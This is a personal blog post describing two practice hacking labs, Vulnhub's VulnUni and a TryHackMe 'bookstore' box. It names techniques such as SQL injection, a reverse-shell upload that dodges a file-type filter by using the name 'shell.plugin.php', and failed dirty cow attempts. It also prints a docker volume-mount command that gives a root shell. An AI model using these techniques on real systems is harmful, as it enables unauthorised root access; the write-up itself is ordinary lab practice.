---
layout: post
title:  "A couple of unsatisfying endeavours"
date:   2020-11-29 20:00:00 +1100
category: hacking
---

## Part The First
*This boot2root machine is realistic without any CTF elements and pretty straight forward.  
Goal: Hack your University and get root access to the server.  
To successfully complete the challenge you need to get user and root flags.  
Difficulty: Easy / Beginner Level*

This is [VULNUNI: 1.0.1](https://www.vulnhub.com/entry/vulnuni-101,439/) from Vulnhub. It's supposed to be easy.

## What went right?
Actually, not much. This box runs [GUnet OpenEclass](https://www.exploit-db.com/exploits/48163) on the webserver and there's supposed to be an initial SQLi to get some creds, then upload a reverse shell once you are logged in as admin. I followed all the instructions and tried multiple times, but *sqlmap* just **would not** dump the database contents. It was a time-based blind injection, but it just wouldn't work for me. Sqlmap would detect the injection, but dump the contents? No sir.

Anyway I got the creds from a write up and pressed ahead. I got my shell, and we've got an ancient kernel so *dirty cow* was the privesc. Trouble is there are like 12 different versions; I tried two and they both immediately crashed the kernel. I couldn't be bothered working through a bunch of others to find one that actually worked. Fail.

## Part The Second
I saw there was a new machine on TryHackMe called 'bookstore' but I couldn't see the link, so I went to https://tryhackme.com/jr/bookstore to get started. 'jr' is 'join room'.

The description said:

*A startup company hosted a website for selling a books.  
They did not performed any security testing.  
Can you get the root access to their server?*

The box had HTTP open, and went immediately to a page for *file thingie*, a PHP based file manager. Nothing about books; curious. Anyway I found a vulnerability to exploit - login with guest:guest and upload a shell with the filename *shell.plugin.php*. All other file types I tried were banned, but *plugin.php* was okay. Then it was in, read some SSH creds, SSH in.

Privesc was docker:

{% highlight shell %}
user@ubuntu-server:~$ docker run -it -v /:/mnt alpine chroot /mnt
groups: cannot find name for group ID 11
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@a3d38565e984:/# cd /root
root@a3d38565e984:~# ls -lash
total 36K
4.0K drwx------  6 root root 4.0K May 16  2020 .
4.0K drwxr-xr-x 24 root root 4.0K May 16  2020 ..
4.0K -rw-------  1 root root   61 May 16  2020 .bash_history
4.0K drwx------  2 root root 4.0K Apr 26  2018 .cache
4.0K drwx------  5 root root 4.0K May 16  2020 .config
4.0K drwx------  3 root root 4.0K May 16  2020 .gnupg
4.0K drwxr-xr-x  3 root root 4.0K May 16  2020 .local
4.0K -rw-r--r--  1 root root  148 Aug 17  2015 .profile
4.0K -rw-r--r--  1 root root   19 May 16  2020 flag.txt
root@a3d38565e984:~# cat flag.txt
This is awesome!!!
root@a3d38565e984:~# exit
{% endhighlight %}

So far, so good right? Well, it gets better - or more bizarre, depending on how you look at it. One of the room tasks was:

>What are the default credentials?

And the answer it accepted was *admin:admin*; not *guest:guest*. Strange. 

Then I looked at the leaderboard - I was the only one to have rooted this box! And only one other person had done any of the tasks at all? Weird. The room stats says:

>6 users are in here and this room is 199 days old.

So, not popular.

Anyway, what I later found out is that the new room is at https://tryhackme.com/room/bookstoreoc - i.e. a different 'bookstore'. LOL. Ah well it's all grist for the mill I guess.
